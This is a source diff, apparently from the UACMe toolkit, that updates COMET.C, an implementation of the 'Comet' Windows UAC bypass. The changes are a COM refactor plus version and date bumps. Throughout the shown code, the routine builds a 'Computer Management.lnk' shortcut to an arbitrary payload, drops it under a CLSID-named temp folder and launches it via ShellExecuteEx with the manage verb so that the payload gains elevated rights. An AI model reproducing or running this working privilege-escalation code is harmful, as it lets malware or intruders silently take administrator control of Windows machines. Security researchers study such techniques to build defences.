@@ -4,9 +4,9 @@
 *
 *  TITLE:       COMET.C
 *
-*  VERSION:     2.90
+*  VERSION:     3.00
 *
-*  DATE:        16 July 2018
+*  DATE:        25 Aug 2018
 *
 *  Comet method (c) BreakingMalware
 *  For description please visit original URL 
@@ -42,9 +42,10 @@ BOOL ucmCometMethod(
     PVOID   OldValue = NULL;
 #endif
 
+    HRESULT hr_init;
+
     BOOL    bCond = FALSE, bResult = FALSE;
     WCHAR   szCombinedPath[MAX_PATH * 2], szLinkFile[MAX_PATH * 3];
-    HRESULT hResult;
 
     IPersistFile    *persistFile = NULL;
     IShellLink      *newLink = NULL;
@@ -108,42 +109,41 @@ BOOL ucmCometMethod(
                 break;
         }
 
-        hResult = CoInitialize(NULL);
-        if (SUCCEEDED(hResult)) {
-            hResult = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (LPVOID *)&newLink);
-            if (SUCCEEDED(hResult)) {
-                newLink->lpVtbl->SetPath(newLink, lpszPayload);
-                newLink->lpVtbl->SetArguments(newLink, L"");
-                newLink->lpVtbl->SetDescription(newLink, L"Comet method");
-                hResult = newLink->lpVtbl->QueryInterface(newLink, &IID_IPersistFile, (void **)&persistFile);
-                if (SUCCEEDED(hResult)) {
+        hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+        if (SUCCEEDED(CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (LPVOID *)&newLink))) {
+            newLink->lpVtbl->SetPath(newLink, lpszPayload);
+            newLink->lpVtbl->SetArguments(newLink, L"");
+            newLink->lpVtbl->SetDescription(newLink, L"Comet method");
+            if (SUCCEEDED(newLink->lpVtbl->QueryInterface(newLink, &IID_IPersistFile, (void **)&persistFile))) {
+                _strcpy(szLinkFile, szCombinedPath);
+                _strcat(szLinkFile, L"\\Computer Management.lnk");
+                if (SUCCEEDED(persistFile->lpVtbl->Save(persistFile, szLinkFile, TRUE))) {
+                    persistFile->lpVtbl->Release(persistFile);
+
+                    _strcpy(szCombinedPath, g_ctx.szTempDirectory);
+                    _strcat(szCombinedPath, SOMEOTHERNAME);
                     _strcpy(szLinkFile, szCombinedPath);
-                    _strcat(szLinkFile, L"\\Computer Management.lnk");
-                    if (SUCCEEDED(persistFile->lpVtbl->Save(persistFile, szLinkFile, TRUE))) {
-                        persistFile->lpVtbl->Release(persistFile);
+                    _strcat(szLinkFile, T_CLSID_MYCOMPUTER_COMET);
 
-                        _strcpy(szCombinedPath, g_ctx.szTempDirectory);
-                        _strcat(szCombinedPath, SOMEOTHERNAME);
-                        _strcpy(szLinkFile, szCombinedPath);
-                        _strcat(szLinkFile, T_CLSID_MYCOMPUTER_COMET);
-
-                        RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
-                        shinfo.cbSize = sizeof(shinfo);
-                        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
-                        shinfo.lpFile = szLinkFile;
-                        shinfo.lpParameters = L"";
-                        shinfo.lpVerb = MANAGE_VERB;
-                        shinfo.lpDirectory = szCombinedPath;
-                        shinfo.nShow = SW_SHOW;
-                        if (ShellExecuteEx(&shinfo)) {
-                            CloseHandle(shinfo.hProcess);
-                            bResult = TRUE;
-                        }
+                    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
+                    shinfo.cbSize = sizeof(shinfo);
+                    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+                    shinfo.lpFile = szLinkFile;
+                    shinfo.lpParameters = L"";
+                    shinfo.lpVerb = MANAGE_VERB;
+                    shinfo.lpDirectory = szCombinedPath;
+                    shinfo.nShow = SW_SHOW;
+                    if (ShellExecuteEx(&shinfo)) {
+                        CloseHandle(shinfo.hProcess);
+                        bResult = TRUE;
                     }
                 }
-                newLink->lpVtbl->Release(newLink);
             }
+            newLink->lpVtbl->Release(newLink);
         }
+
+        if (hr_init == S_OK)
+            CoUninitialize();
 
     } while (bCond);
 
